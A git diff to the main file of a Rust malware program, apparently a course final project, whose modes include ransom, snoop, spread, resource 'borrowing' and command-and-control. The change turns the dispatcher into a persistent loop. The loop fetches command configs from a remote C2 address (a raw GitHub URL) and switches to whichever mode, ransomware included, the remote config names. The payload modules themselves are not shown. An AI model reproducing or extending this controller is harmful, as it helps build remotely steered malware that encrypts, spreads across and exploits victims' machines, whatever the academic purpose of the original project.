@@ -2,6 +2,7 @@ use clap::{Parser, Subcommand};
 use config::{Config, ConfigError, FileFormat};
 use env_logger::{fmt::Target, Builder};
 use log::{error, info, warn, Level};
+use serde::Deserialize;
 use std::{io::Write, path::PathBuf};
 
 mod borrow;
@@ -16,7 +17,7 @@ use ransom::*;
 use snoop::*;
 use spread::*;
 
-#[derive(Parser)]
+#[derive(Parser, Clone)]
 #[command(author, version, about, long_about = None)]
 struct Cli {
     /// Sets a custom config file
@@ -39,7 +40,8 @@ struct Cli {
     mode: Option<Modes>,
 }
 
-#[derive(Subcommand)]
+#[derive(Subcommand, Clone, Deserialize)]
+#[serde(rename_all = "lowercase")]
 enum Modes {
     /// Utilize system resources
     Borrow,
@@ -87,12 +89,6 @@ fn main() {
     };
     builder.filter(None, verbosity.to_level_filter()).init();
 
-    // Get the user specified config path, if any
-    let conf: Option<Config> = match cli.config.as_deref() {
-        Some(conf_path) => read_config(conf_path).ok(),
-        None => None,
-    };
-
     // Check if the user provided a working directory
     if let Some(pwd) = cli.pwd {
         match std::env::set_current_dir(pwd) {
@@ -101,26 +97,59 @@ fn main() {
         }
     }
 
-    // run the user specified mode
-    if let Some(mode) = cli.mode {
-        match mode {
-            Modes::Borrow => borrow(get_exe(&conf), get_exeargs(&conf)),
-            Modes::Ransom => ransom(&get_root(&conf), &get_c2(&conf)),
-            Modes::Snoop => snoop(),
-            Modes::Spread => spread(),
-            Modes::DumpConfig => dumpconf(&conf),
-            Modes::GetCommand => get_commands(get_c2s(&conf), get_docname(&conf)),
-            Modes::CnC => establish_c2(),
-            // _ => unreachable!(), // panics if code becomes not unreachable
+    let mut alive = true;
+    let mut new_conf = false;
+    let mut recent_mode: Option<Modes> = Some(Modes::GetCommand);
+
+    // Get the user specified config path, if any
+    let mut conf: Option<Config> = match cli.config.as_deref() {
+        Some(conf_path) => match read_config(conf_path) {
+            Ok(out) => {
+                info!("read config: {out:?}");
+                Some(out)
+            }
+            Err(e) => {
+                error!("error reading config: {e}");
+                None
+            }
+        },
+        None => None,
+    };
+
+    while alive {
+        if new_conf {
+            info!("switching to new config");
+            conf = read_config("./recent.json").ok();
+            new_conf = false;
+            recent_mode = Some(get_mode(&conf));
         }
-    } else {
-        warn!("no mode specified");
+        // run the user specified mode
+        if let Some(mode) = recent_mode.clone() {
+            match mode.clone() {
+                Modes::Borrow => borrow(get_exe(&conf), get_exeargs(&conf)),
+                Modes::Ransom => ransom(&get_root(&conf), &get_c2(&conf)),
+                Modes::Snoop => snoop(),
+                Modes::Spread => spread(),
+                Modes::DumpConfig => dumpconf(&conf),
+                Modes::GetCommand => {
+                    get_commands(get_c2s(&conf), get_docname(&conf));
+                    new_conf = true;
+                }
+                Modes::CnC => establish_c2(),
+                // _ => unreachable!(), // panics if code becomes not unreachable
+            }
+        } else {
+            warn!("no mode specified, exiting logic loop");
+            alive = false;
+        }
     }
 
     info!("finished!");
 }
 
 fn read_config(path: &str) -> Result<Config, ConfigError> {
+    info!("reading config from {path}");
+
     let builder = Config::builder()
         .set_default("default", "1")?
         .add_source(config::File::new(path, FileFormat::Json))
@@ -145,15 +174,26 @@ where
     if let Some(conf) = config {
         // query for field in config
         match conf.get::<T>(field) {
-            Ok(t) => Some(t),
+            Ok(t) => {
+                info!("found field {field} in {config:?}");
+                Some(t)
+            }
             Err(e) => {
                 error!("{e:?}");
                 None
             }
         }
     } else {
-        error!("could not find {field} in config");
+        error!("could not find {field} in {config:?}");
         None
+    }
+}
+
+fn get_mode(conf: &Option<Config>) -> Modes {
+    if let Some(mode) = get_field("mode", conf) {
+        mode
+    } else {
+        Modes::DumpConfig
     }
 }
 
@@ -190,9 +230,8 @@ fn get_c2s(conf: &Option<Config>) -> Vec<String> {
     if let Some(c2s) = get_field("c2", conf) {
         c2s
     } else {
-        // empty
         warn!("no c2s found, sensible defaults provided");
-        vec![String::from("localhost:8888"), String::from("localhost:80")]
+        vec![String::from("https://raw.githubusercontent.com/gahill18/enpm697_finalproject/main/luciferris/example_configs/")]
     }
 }
 
@@ -200,6 +239,6 @@ fn get_docname(conf: &Option<Config>) -> String {
     if let Some(docname) = get_field("c2docname", conf) {
         docname
     } else {
-        String::from("./conf.json")
+        String::from("get_command.json")
     }
 }
